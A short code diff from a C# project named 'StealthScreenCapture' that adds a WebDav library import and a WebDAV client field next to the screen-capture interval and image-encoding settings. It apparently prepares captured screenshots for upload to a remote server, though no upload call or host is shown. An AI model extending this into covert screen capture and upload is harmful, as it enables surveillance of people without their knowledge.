@@ -4,6 +4,7 @@ using System.Threading;
 using System.Drawing.Imaging;
 using Microsoft.Extensions.Configuration;
 using System;
+using WebDav;
 
 namespace StealthScreenCapture
 {
@@ -12,6 +13,7 @@ namespace StealthScreenCapture
         static int CaptureInterval;
         static ImageCodecInfo Codec;
         static EncoderParameters ImageEncoderParameters;
+        static IWebDavClient Client = new WebDavClient();
         static void loadLogger()
         {
             string logFile = Path.Join(Directory.GetCurrentDirectory(), "logs.txt");
